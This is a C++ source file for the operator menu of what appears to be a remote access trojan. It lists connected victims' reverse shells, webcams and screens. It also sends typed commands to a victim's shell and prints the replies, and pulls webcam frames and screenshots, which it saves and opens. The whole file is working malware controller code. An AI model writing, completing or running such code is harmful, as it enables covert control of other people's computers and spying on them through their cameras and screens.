#include "Menu.h"

int Menu::printCameras(Communication* communication) {
    int count = 0;
    cout << "Active cameras: " << endl;
    map<unsigned int, tuple<SOCKET, string>> cameras = communication->getCameras();
    for (auto shell = cameras.begin(); shell != cameras.end(); ++shell) {
        cout << get<1>(shell->second) << " - " << shell->first << endl;
        count++;
    }

    return count;
}

int Menu::printRevShells(Communication* communication) {
    int count = 0;
	cout << "Active rev shells: " << endl;
	map<unsigned int, tuple<SOCKET, string>> rev_shells = communication->getRevShells();
	for (auto shell = rev_shells.begin(); shell != rev_shells.end(); ++shell) {
		cout << get<1>(shell->second) << " - " << shell->first << endl;
        count++;
	}

    return count;
}

int Menu::printScreens(Communication* communication) {
    int count = 0;
    cout << "Active Screens: " << endl;
    map<unsigned int, tuple<SOCKET, string>> rev_shells = communication->getScreens();
    for (auto shell = rev_shells.begin(); shell != rev_shells.end(); ++shell) {
        cout << get<1>(shell->second) << " - " << shell->first << endl;
        count++;
    }

    return count;
}

int Menu::printOptions() {
	int op;
	cout << "Options: " << endl;
	cout << "[1] rev shell" << endl;
	cout << "[2] camera" << endl;
    cout << "[3] screen" << endl;
	cout << "[0] exit" << endl;
	cout << ">> ";
	cin >> op;

	return op;
}

void Menu::sendShellByID(Communication* communication, unsigned int id) {
	map<unsigned int, tuple<SOCKET, string>> rev_shells = communication->getRevShells();

	if (rev_shells.find(id) == rev_shells.end()) {
		cout << "id not found." << endl;
		return;
	}

	SOCKET socket = get<0>(communication->getRevShells()[id]);
    string data;
    try {
        std::cout << "command >> ";
        std::cin >> data;
        send(socket, data.c_str(), data.size(), 0);
        char buffer[2048] = { 0 };
		int bytesReceived = recv(socket, buffer, LENGTH, 0);
		int result = (static_cast<unsigned char>(buffer[0]) << 24) |
			(static_cast<unsigned char>(buffer[1]) << 16) |
			(static_cast<unsigned char>(buffer[2]) << 8) |
			(static_cast<unsigned char>(buffer[3]));

		bytesReceived = recv(socket, buffer, result, 0);

		string res = buffer;

        if (bytesReceived <= 0) {
            throw std::runtime_error("Communication::shellHandler() - recv");
        }

        std::cout << res << std::endl;

    }
	catch (const std::exception& e) {
		std::cout << "Error: " << e.what() << std::endl;
	}

}

void Menu::sendCameraByID(Communication* communication, unsigned int id) {
    static int i = 0;
    string data = "shot";
    string file_name = "frame_";
    string end = "";
    SOCKET socket = get<0>(communication->getCameras()[id]);

    try {
        send(socket, data.c_str(), data.size(), 0);

        std::ofstream outFile;
        file_name += std::to_string(i) + ".png";
        outFile.open(file_name, std::ios::binary | std::ios::out);

        if (!outFile.is_open()) {
            throw std::runtime_error("Failed to open file");
        }

        char buffer[1024] = { 0 };
        int bytesReceived = 0;
        end = "";
        while (true) {
            bytesReceived = recv(socket, buffer, 1024, 0);
            end = buffer+4;
            end = end.substr(0, 3);
            if (end == "end") {
                break;
            }
            outFile.write(buffer, bytesReceived);
        }

        if (bytesReceived == SOCKET_ERROR) {
            throw std::runtime_error("Communication::cameraHandler() - recv");
        }

        outFile.close();
        i++;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    system(file_name.c_str());
}

void Menu::sendScreenByID(Communication* communication, unsigned int id) {
    static int i = 0;
    string data = "shot";
    string file_name = "screen_";
    string end = "";
    SOCKET socket = get<0>(communication->getScreens()[id]);

    try {
        send(socket, data.c_str(), data.size(), 0);

        std::ofstream outFile;
        file_name += std::to_string(i) + ".png";
        outFile.open(file_name, std::ios::binary | std::ios::out);

        if (!outFile.is_open()) {
            throw std::runtime_error("Failed to open file");
        }

        char buffer[1024] = { 0 };
        int bytesReceived = 0;
        end = "";
        while (true) {
            bytesReceived = recv(socket, buffer, 1024, 0);
            end = buffer + 4;
            end = end.substr(0, 3);
            if (end == "end") {
                break;
            }
            outFile.write(buffer, bytesReceived);
        }

        if (bytesReceived == SOCKET_ERROR) {
            throw std::runtime_error("Communication::cameraHandler() - recv");
        }

        outFile.close();
        i++;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    system(file_name.c_str());
}
